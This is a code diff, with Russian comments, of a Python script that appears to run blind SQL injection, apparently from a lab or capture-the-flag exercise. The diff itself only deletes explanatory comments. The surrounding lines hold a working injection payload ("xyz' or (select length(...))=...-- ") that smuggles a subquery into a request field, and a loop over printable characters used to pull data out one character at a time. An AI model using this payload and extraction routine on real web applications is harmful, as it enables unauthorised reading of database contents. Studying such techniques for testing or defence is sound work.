@@ -28,10 +28,7 @@ IPython (англ. Interactive Python)
 import string
 string.printable
 """
-#что в итоге нам выдало: 
-#Out[2]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 
 AVAIL_CHARS = string.printable 
-#и переменная avail_char (доступные символы хранит в себе подобный response)
 MAX_LENGTH = 100
 def format_length_query(inner_query, length):
     return f"xyz' or (select length(({inner_query}))={length})-- "
@@ -73,14 +70,6 @@ def determine_response_length(inner_query, url, no_proxy=False):
 
 
 def determine_response_char(task):
-    """
-    chars = [ord(x) for x in AVAIL_CHARS]
-    Это генератор списка (list comprehension), который:
-
-    Проходит по каждому символу x из строки AVAIL_CHARS.
-    Преобразует этот символ в его ASCII-код с помощью ord(x).
-    Собирает все ASCII-коды в новый список.
-    """
     sess = requests.Session()
     chars = [ord(x) for x in AVAIL_CHARS]
     for x in chars:
